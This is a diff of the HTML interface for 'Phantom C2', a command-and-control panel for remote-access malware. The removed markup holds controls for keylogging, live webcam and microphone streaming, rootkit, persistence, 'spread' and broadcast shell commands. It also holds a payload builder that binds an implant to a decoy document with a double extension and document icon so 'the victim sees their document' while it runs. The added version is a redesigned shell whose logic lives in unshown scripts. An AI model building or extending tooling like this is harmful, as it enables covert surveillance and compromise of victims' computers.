@@ -1,280 +1,147 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Phantom C2</title>
-  <link rel="stylesheet" href="/style.css">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<meta name="robots" content="noindex">
+<title>Operations · Phantom</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/style.css">
+<link rel="stylesheet" href="/views.css">
 </head>
 <body>
-<div class="app">
-  <nav class="rail">
-    <div class="brand">P</div>
-    <button data-tab="ops" class="on" title="Operations" aria-label="Operations">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
-        <rect x="3" y="4" width="18" height="7" rx="2"/><rect x="3" y="14" width="18" height="6" rx="2"/>
-        <circle cx="7" cy="7.5" r=".9" fill="currentColor"/><circle cx="7" cy="17" r=".9" fill="currentColor"/>
-      </svg>
-    </button>
-    <button data-tab="build" title="Builder" aria-label="Builder">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
-        <path d="M12 3l8 4.5v9L12 21l-8-4.5v-9L12 3z"/><path d="M12 12l8-4.5M12 12v9M12 12L4 7.5"/>
-      </svg>
-    </button>
-    <span class="spacer"></span>
-  </nav>
 
-  <div class="workspace">
-    <header class="topbar">
-      <h1>Phantom C2</h1>
-      <span class="pill" id="status">disconnected</span>
-      <span class="spacer"></span>
-      <span class="pill" id="count">0 hosts</span>
+<a class="skip" href="#main">Skip to content</a>
+
+<svg class="sprite" aria-hidden="true" focusable="false">
+  <symbol id="i-grid" viewBox="0 0 24 24"><rect x="3" y="3" width="7.5" height="7.5" rx="1.6"/><rect x="13.5" y="3" width="7.5" height="7.5" rx="1.6"/><rect x="3" y="13.5" width="7.5" height="7.5" rx="1.6"/><rect x="13.5" y="13.5" width="7.5" height="7.5" rx="1.6"/></symbol>
+  <symbol id="i-fleet" viewBox="0 0 24 24"><rect x="2.5" y="4" width="19" height="12" rx="2"/><path d="M8 20h8M12 16v4"/></symbol>
+  <symbol id="i-box" viewBox="0 0 24 24"><path d="M12 3l8 4.4v9.2L12 21l-8-4.4V7.4L12 3z"/><path d="M12 12l8-4.6M12 12v9M12 12L4 7.4"/></symbol>
+  <symbol id="i-pulse" viewBox="0 0 24 24"><path d="M2.5 12h4l2.5-6 4 12 3-6h5.5"/></symbol>
+  <symbol id="i-env" viewBox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h10"/><circle cx="17.5" cy="17" r="2.4"/></symbol>
+  <symbol id="i-search" viewBox="0 0 24 24"><circle cx="11" cy="11" r="6.5"/><path d="M16 16l4.5 4.5"/></symbol>
+  <symbol id="i-help" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M9.6 9.3a2.5 2.5 0 014.7 1c0 1.7-2.3 1.9-2.3 3.4"/><circle cx="12" cy="17.4" r=".9" fill="currentColor" stroke="none"/></symbol>
+  <symbol id="i-command" viewBox="0 0 24 24"><path d="M9 6.5a2.5 2.5 0 10-2.5 2.5H9m0-2.5v11m0-8.5h6m-6 0V9m6-2.5A2.5 2.5 0 1117.5 9H15m0 0v6m0-6h-6m6 6v2.5A2.5 2.5 0 1017.5 15H15zM9 15v2.5A2.5 2.5 0 116.5 15H9z"/></symbol>
+  <symbol id="i-bell" viewBox="0 0 24 24"><path d="M6.5 9.5a5.5 5.5 0 0111 0c0 3.4.8 5 1.7 6.1.4.5 0 1.4-.7 1.4H5.5c-.7 0-1.1-.9-.7-1.4.9-1.1 1.7-2.7 1.7-6.1z"/><path d="M10 20a2 2 0 004 0"/></symbol>
+  <symbol id="i-close" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></symbol>
+  <symbol id="i-chev" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6"/></symbol>
+  <symbol id="i-chev-d" viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></symbol>
+  <symbol id="i-folder" viewBox="0 0 24 24"><path d="M3 7.5A2 2 0 015 5.5h4l2 2.5h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2v-10z"/></symbol>
+  <symbol id="i-file" viewBox="0 0 24 24"><path d="M13 3H7a2 2 0 00-2 2v14a2 2 0 002 2h10a2 2 0 002-2V9l-6-6z"/><path d="M13 3v6h6"/></symbol>
+  <symbol id="i-term" viewBox="0 0 24 24"><rect x="2.5" y="4" width="19" height="16" rx="2"/><path d="M6.5 9.5l3 2.5-3 2.5M12.5 15h5"/></symbol>
+  <symbol id="i-cpu" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2"/><rect x="9.5" y="9.5" width="5" height="5" rx="1"/><path d="M9 2.5V6M15 2.5V6M9 18v3.5M15 18v3.5M2.5 9H6M2.5 15H6M18 9h3.5M18 15h3.5"/></symbol>
+  <symbol id="i-cam" viewBox="0 0 24 24"><rect x="2.5" y="6.5" width="13" height="11" rx="2.5"/><path d="M15.5 11l6-3.2v8.4l-6-3.2z"/></symbol>
+  <symbol id="i-mic" viewBox="0 0 24 24"><rect x="9" y="3" width="6" height="11" rx="3"/><path d="M6 11.5a6 6 0 0012 0M12 17.5V21M9 21h6"/></symbol>
+  <symbol id="i-key" viewBox="0 0 24 24"><rect x="2.5" y="6" width="19" height="12" rx="2"/><path d="M6.5 10h1M10 10h1M13.5 10h1M17 10h1M8 14h8"/></symbol>
+  <symbol id="i-network" viewBox="0 0 24 24"><circle cx="12" cy="5" r="2.4"/><circle cx="5" cy="19" r="2.4"/><circle cx="19" cy="19" r="2.4"/><path d="M12 7.4v4.2M12 11.6L6.4 17M12 11.6L17.6 17"/></symbol>
+  <symbol id="i-share" viewBox="0 0 24 24"><circle cx="6" cy="12" r="2.5"/><circle cx="18" cy="6" r="2.5"/><circle cx="18" cy="18" r="2.5"/><path d="M8.2 10.8l7.6-3.6M8.2 13.2l7.6 3.6"/></symbol>
+  <symbol id="i-up" viewBox="0 0 24 24"><path d="M12 15V4M7.5 8.5L12 4l4.5 4.5M4.5 19.5h15"/></symbol>
+  <symbol id="i-down" viewBox="0 0 24 24"><path d="M12 4v11M7.5 10.5L12 15l4.5-4.5M4.5 19.5h15"/></symbol>
+  <symbol id="i-anchor" viewBox="0 0 24 24"><circle cx="12" cy="5" r="2.2"/><path d="M12 7.2V21M5 13a7 7 0 0014 0M5 13H2.5M19 13h2.5"/></symbol>
+  <symbol id="i-ghost" viewBox="0 0 24 24"><path d="M4.5 20V9.5a7.5 7.5 0 0115 0V20l-2.5-2-2.5 2-2.5-2L9.5 20 7 18l-2.5 2z"/><circle cx="9.3" cy="10" r=".9" fill="currentColor" stroke="none"/><circle cx="14.7" cy="10" r=".9" fill="currentColor" stroke="none"/></symbol>
+  <symbol id="i-info" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 11v5.5"/><circle cx="12" cy="8" r=".9" fill="currentColor" stroke="none"/></symbol>
+  <symbol id="i-trash" viewBox="0 0 24 24"><path d="M4.5 7h15M9.5 7V4.5h5V7M6.5 7l.8 12.2a1.8 1.8 0 001.8 1.8h5.8a1.8 1.8 0 001.8-1.8L17.5 7"/></symbol>
+  <symbol id="i-copy" viewBox="0 0 24 24"><rect x="8.5" y="8.5" width="12" height="12" rx="2"/><path d="M15.5 5.5v-.2a1.8 1.8 0 00-1.8-1.8H5.3a1.8 1.8 0 00-1.8 1.8v8.4a1.8 1.8 0 001.8 1.8h.2"/></symbol>
+  <symbol id="i-refresh" viewBox="0 0 24 24"><path d="M20 12a8 8 0 10-2.6 5.9"/><path d="M20 5.5V12h-6"/></symbol>
+  <symbol id="i-check" viewBox="0 0 24 24"><path d="M4.5 12.5l5 5 10-11"/></symbol>
+  <symbol id="i-warn" viewBox="0 0 24 24"><path d="M12 3.5L21.5 20h-19L12 3.5z"/><path d="M12 9.5V14"/><circle cx="12" cy="17" r=".9" fill="currentColor" stroke="none"/></symbol>
+  <symbol id="i-bolt" viewBox="0 0 24 24"><path d="M13.5 2.5L4 13.5h6L9.5 21.5 20 10h-6.5l0-7.5z"/></symbol>
+  <symbol id="i-shield" viewBox="0 0 24 24"><path d="M12 2.8l7.5 3v6c0 4.6-3.2 7.8-7.5 9.4-4.3-1.6-7.5-4.8-7.5-9.4v-6l7.5-3z"/><path d="M8.8 12l2.2 2.2 4.2-4.4"/></symbol>
+  <symbol id="i-clock" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5.4l3.4 2"/></symbol>
+  <symbol id="i-desktop" viewBox="0 0 24 24"><rect x="2.5" y="4" width="19" height="13" rx="2"/><path d="M9 20h6M12 17v3"/></symbol>
+  <symbol id="i-layers" viewBox="0 0 24 24"><path d="M12 3l9 5-9 5-9-5 9-5z"/><path d="M3 13l9 5 9-5M3 17.5l9 5 9-5"/></symbol>
+  <symbol id="i-logout" viewBox="0 0 24 24"><path d="M14 4.5h4a2 2 0 012 2v11a2 2 0 01-2 2h-4"/><path d="M9.5 8.5L6 12l3.5 3.5M6 12h9"/></symbol>
+  <symbol id="i-filter" viewBox="0 0 24 24"><path d="M3.5 5.5h17l-6.5 7.5v6l-4 2v-8L3.5 5.5z"/></symbol>
+  <symbol id="i-eye" viewBox="0 0 24 24"><path d="M2.5 12S6 5.5 12 5.5 21.5 12 21.5 12 18 18.5 12 18.5 2.5 12 2.5 12z"/><circle cx="12" cy="12" r="2.8"/></symbol>
+  <symbol id="i-plus" viewBox="0 0 24 24"><path d="M12 5v14M5 12h14"/></symbol>
+  <symbol id="i-save" viewBox="0 0 24 24"><path d="M5 3.5h11l3.5 3.5v13H5z"/><path d="M8.5 3.5v6h7v-6M8.5 20.5v-6h7v6"/></symbol>
+  <symbol id="i-link" viewBox="0 0 24 24"><path d="M9.5 14.5l5-5"/><path d="M8 11L5.5 13.5a4 4 0 105.6 5.6L13.6 16.6M16 13l2.5-2.5a4 4 0 10-5.6-5.6L10.4 7.4"/></symbol>
+
+</svg>
+
+<div class="app">
+  <aside class="side">
+    <div class="side-brand">
+      <span class="mark">P</span>
+      <span class="name">Phantom</span>
+      <span class="tag">c2</span>
+    </div>
+
+    <div class="workspace">
+      <span>Workspace</span>
+      <b><span class="dot online"></span>Production</b>
+      <em id="ws-endpoint">—</em>
+    </div>
+
+    <nav class="nav" aria-label="Primary">
+      <div class="nav-group">Operate</div>
+      <a class="nav-item" href="#/overview" data-nav="overview"><svg class="ico"><use href="#i-grid"/></svg><span>Overview</span></a>
+      <a class="nav-item" href="#/fleet" data-nav="fleet"><svg class="ico"><use href="#i-fleet"/></svg><span>Fleet</span><em id="nav-fleet" hidden>0</em></a>
+      <a class="nav-item" href="#/payloads" data-nav="payloads"><svg class="ico"><use href="#i-box"/></svg><span>Payloads</span></a>
+      <a class="nav-item" href="#/activity" data-nav="activity"><svg class="ico"><use href="#i-pulse"/></svg><span>Activity</span><em id="nav-activity" hidden>0</em></a>
+      <div class="nav-group">Platform</div>
+      <a class="nav-item" href="#/environment" data-nav="environment"><svg class="ico"><use href="#i-env"/></svg><span>Environment</span></a>
+      <button class="nav-item" id="shortcuts" type="button"><svg class="ico"><use href="#i-help"/></svg><span>Shortcuts</span></button>
+    </nav>
+
+    <div class="side-foot">
+      <span class="conn" id="conn" role="status"><span class="dot"></span><b>connecting</b></span>
+      <button class="user" id="user-btn" type="button" title="Sign out">
+        <span class="avatar" id="user-initials">OP</span>
+        <span class="who"><b id="user-name">operator</b><span id="user-role">control plane</span></span>
+        <svg class="ico"><use href="#i-logout"/></svg>
+      </button>
+    </div>
+  </aside>
+
+  <div class="main">
+    <header class="top">
+      <div class="crumbs" id="crumbs" aria-live="polite"></div>
+      <button class="omni" id="omni" type="button">
+        <svg class="ico"><use href="#i-search"/></svg>
+        <span>Search hosts, jump anywhere</span>
+        <kbd>Ctrl K</kbd>
+      </button>
+      <div class="top-right">
+        <button class="iconbtn" id="bell" type="button" title="Activity">
+          <svg class="ico"><use href="#i-bell"/></svg><em id="bell-count" hidden>0</em>
+        </button>
+        <button class="iconbtn" id="palette-btn" type="button" title="Command palette">
+          <svg class="ico"><use href="#i-command"/></svg>
+        </button>
+      </div>
     </header>
 
-    <main id="ops" class="tab ops on">
-      <aside class="hosts">
-        <div class="hosts-head">
-          <input id="search" placeholder="filter hosts…">
-          <select id="sort">
-            <option value="name">name</option>
-            <option value="ip">ip</option>
-            <option value="seen">last seen</option>
-          </select>
-        </div>
-        <div class="hosts-meta">
-          <label class="switch"><input type="checkbox" id="selectall"></label>
-          <span>all</span>
-          <span class="spacer"></span>
-          <button id="export" class="mini">export</button>
-        </div>
-        <ul class="host-list" id="sessions"></ul>
-      </aside>
-
-      <section class="panel">
-        <div class="targetbar">
-          <span class="who" id="target">no host selected</span>
-          <span class="path" id="targetpath"></span>
-        </div>
-
-        <div class="actions">
-          <select id="btype">
-            <option value="shell">shell</option>
-            <option value="lsjson">list</option>
-            <option value="sysinfo">sysinfo</option>
-            <option value="ps">processes</option>
-            <option value="screenshot">screenshot</option>
-            <option value="cam_stream">camera live</option>
-            <option value="mic_stream">mic live</option>
-            <option value="persist">persist</option>
-            <option value="rootkit">rootkit</option>
-            <option value="socks">socks</option>
-            <option value="keylog">keylog</option>
-            <option value="scan">scan</option>
-            <option value="spread">spread</option>
-            <option value="kill">kill</option>
-          </select>
-          <input id="bcmd" class="grow" placeholder="command for every selected host…">
-          <button id="bgo" class="primary">Broadcast</button>
-          <span class="msg" id="bstatus"></span>
-        </div>
-
-        <div class="actions">
-          <button class="chip" data-q="whoami">whoami</button>
-          <button class="chip" data-q="ls">ls</button>
-          <button class="chip" data-q="sysinfo">sysinfo</button>
-          <button class="chip" data-q="ps">ps</button>
-          <button class="chip" data-q="screenshot">screen</button>
-          <button class="chip acc" data-q="cam">camera</button>
-          <button class="chip acc" data-q="mic">mic</button>
-          <button class="chip" data-q="persist">persist</button>
-          <button class="chip" data-q="rootkit">rootkit</button>
-          <button class="chip" data-q="socks">socks</button>
-          <button class="chip" data-q="keylog start">keylog</button>
-          <button class="chip" data-q="scan">scan</button>
-        </div>
-
-        <div class="tabs">
-          <button data-st="console" class="on">Console</button>
-          <button data-st="files">Files</button>
-          <button data-st="media">Media</button>
-          <button data-st="keylog">Keylog</button>
-          <button data-st="info">Info</button>
-        </div>
-
-        <div id="console" class="tabpane on">
-          <div class="term" id="term"></div>
-          <form class="composer" id="cmdform">
-            <input id="cmd" class="grow" placeholder="type a command and press enter" autocomplete="off" autofocus>
-            <select id="type">
-              <option value="shell">shell</option>
-              <option value="ls">ls</option>
-              <option value="lsjson">lsjson</option>
-              <option value="cat">cat</option>
-              <option value="sysinfo">sysinfo</option>
-              <option value="ps">ps</option>
-              <option value="download">download</option>
-              <option value="screenshot">screenshot</option>
-              <option value="webcam">webcam</option>
-              <option value="mic">mic</option>
-              <option value="cam_stream">cam live</option>
-              <option value="mic_stream">mic live</option>
-              <option value="persist">persist</option>
-              <option value="rootkit">rootkit</option>
-              <option value="socks">socks</option>
-              <option value="keylog">keylog</option>
-              <option value="scan">scan</option>
-              <option value="spread">spread</option>
-            </select>
-            <button class="primary">Run</button>
-            <button type="button" id="clear" class="ghost">clear</button>
-          </form>
-        </div>
-
-        <div id="files" class="tabpane">
-          <div class="pathbar">
-            <input id="fpath" class="grow" value=".">
-            <button id="flist" class="ghost">List</button>
-            <input id="fupload" type="file">
-            <button id="fup" class="ghost">Upload here</button>
-          </div>
-          <table id="ftable">
-            <thead><tr><th>name</th><th>size</th><th></th></tr></thead>
-            <tbody></tbody>
-          </table>
-        </div>
-
-        <div id="media" class="tabpane">
-          <div class="live">
-            <div class="card">
-              <div class="card-head">
-                <strong>Live camera</strong>
-                <span class="spacer"></span>
-                <select id="cam_fps" class="mini">
-                  <option value="1">1 fps</option>
-                  <option value="2" selected>2 fps</option>
-                  <option value="5">5 fps</option>
-                  <option value="10">10 fps</option>
-                </select>
-                <button id="cam_on" class="mini">start</button>
-                <button id="cam_off" class="mini">stop</button>
-              </div>
-              <div class="card-body">
-                <img id="camview" alt="camera stream">
-                <div class="sub2 meta" id="camstat">idle</div>
-              </div>
-            </div>
-            <div class="card">
-              <div class="card-head">
-                <strong>Live microphone</strong>
-                <span class="spacer"></span>
-                <button id="mic_on" class="mini">listen</button>
-                <button id="mic_off" class="mini">mute</button>
-              </div>
-              <div class="card-body">
-                <canvas id="micwave" height="84"></canvas>
-                <div class="meter"><i id="miclevel"></i></div>
-                <div class="meta" id="micstat">idle</div>
-              </div>
-            </div>
-          </div>
-          <div class="pathbar">
-            <button id="shot" class="ghost">screenshot</button>
-            <button id="snap" class="ghost">webcam snap</button>
-            <button id="recwav" class="ghost">mic clip 5s</button>
-            <span class="spacer"></span>
-            <button id="medclear" class="ghost">clear gallery</button>
-          </div>
-          <div class="gallery" id="mediaout"></div>
-        </div>
-
-        <div id="keylog" class="tabpane">
-          <div class="pathbar">
-            <button id="klstart" class="ghost">start</button>
-            <button id="kldump" class="ghost">dump</button>
-            <button id="klclear" class="ghost">dump + clear</button>
-            <button id="klstop" class="ghost">stop</button>
-          </div>
-          <pre class="out" id="klout"></pre>
-        </div>
-
-        <div id="info" class="tabpane">
-          <div class="fieldrow">
-            <label class="inline">sleep <input id="i_sleep" type="number" value="3" min="1"></label>
-            <label class="inline">jitter <input id="i_jitter" type="number" value="20" min="0" max="90"></label>
-            <button id="i_set" class="ghost">apply</button>
-          </div>
-          <div class="fieldrow">
-            <input id="i_note" class="grow" placeholder="note…">
-            <input id="i_tags" placeholder="tags, comma, sep">
-            <button id="i_save" class="ghost">save</button>
-          </div>
-          <pre class="out" id="infoout"></pre>
-        </div>
-      </section>
-    </main>
-
-    <main id="build" class="tab">
-      <div class="builder">
-        <h2>Payload builder</h2>
-        <p class="sub">Drop any file and you get one launcher: the victim sees their
-          document, the implant runs silently behind it.</p>
-
-        <div class="dropzone" id="drop">
-          <input type="file" id="b_file">
-          <div id="dropmsg">
-            <div class="big">Drop a file or click to choose</div>
-            <div class="hint">pdf · docx · xlsx · zip · jpg · any file</div>
-          </div>
-        </div>
-
-        <div class="grid2">
-          <label>output name <input id="b_name" placeholder="invoice"></label>
-          <label>platform
-            <select id="b_os">
-              <option value="windows">windows</option>
-              <option value="linux">linux</option>
-              <option value="darwin">macOS</option>
-            </select>
-          </label>
-          <label>architecture
-            <select id="b_arch"><option>amd64</option><option>arm64</option><option>386</option></select>
-          </label>
-          <label>start delay (s) <input id="b_delay" type="number" value="0" min="0"></label>
-          <label class="wide">callback url
-            <span class="row">
-              <input id="b_url" placeholder="auto-detected">
-              <button type="button" class="ghost" id="b_autourl">auto</button>
-            </span>
-            <span class="hint" id="b_urlhint"></span>
-          </label>
-          <label>sleep (s) <input id="b_sleep" type="number" value="3" min="1"></label>
-          <label>jitter (%) <input id="b_jitter" type="number" value="20" min="0" max="90"></label>
-        </div>
-
-        <div class="switches">
-          <label class="switch"><input type="checkbox" id="b_double" checked> double extension</label>
-          <label class="switch"><input type="checkbox" id="b_icon" checked> document icon</label>
-          <label class="switch"><input type="checkbox" id="b_console"> console window</label>
-          <label class="switch"><input type="checkbox" id="b_fileless"> fileless .sh (linux)</label>
-        </div>
-
-        <div class="buildbar">
-          <button id="b_build" class="primary">Bind &amp; build</button>
-          <button id="b_raw" class="ghost">raw implant</button>
-          <span class="msg" id="b_msg"></span>
-        </div>
-
-        <ul class="artifacts" id="builds"></ul>
-      </div>
+    <main class="content" id="main" tabindex="-1">
+      <div class="view" id="view-overview" hidden></div>
+      <div class="view" id="view-fleet" hidden></div>
+      <div class="view" id="view-host" hidden></div>
+      <div class="view" id="view-payloads" hidden></div>
+      <div class="view" id="view-activity" hidden></div>
+      <div class="view" id="view-environment" hidden></div>
     </main>
   </div>
 </div>
 
-<div class="toasts" id="toasts"></div>
-<div class="dlbar"><span>downloads</span><div class="list" id="dllist"></div></div>
+<div class="toasts" id="toasts" role="status" aria-live="polite"></div>
+<div class="dlbar" id="downloads" hidden><span>downloads</span><div class="dl-list" id="dl-list"></div></div>
 
-<script src="/app.js"></script>
+<div class="palette" id="palette" hidden role="dialog" aria-modal="true" aria-label="Command palette">
+  <div class="palette-box">
+    <div class="palette-input">
+      <svg class="ico"><use href="#i-search"/></svg>
+      <input id="palette-q" placeholder="Jump to a host, run an action, open a view…" autocomplete="off">
+      <kbd>esc</kbd>
+    </div>
+    <ul class="palette-list" id="palette-list" role="listbox"></ul>
+    <div class="palette-foot"><span><kbd>↑</kbd><kbd>↓</kbd> navigate</span><span><kbd>↵</kbd> run</span></div>
+  </div>
+</div>
+
+<div class="modal" id="modal" hidden role="dialog" aria-modal="true"></div>
+<div class="lightbox" id="lightbox" hidden></div>
+
+<script type="module" src="/js/main.js"></script>
 </body>
 </html>
-
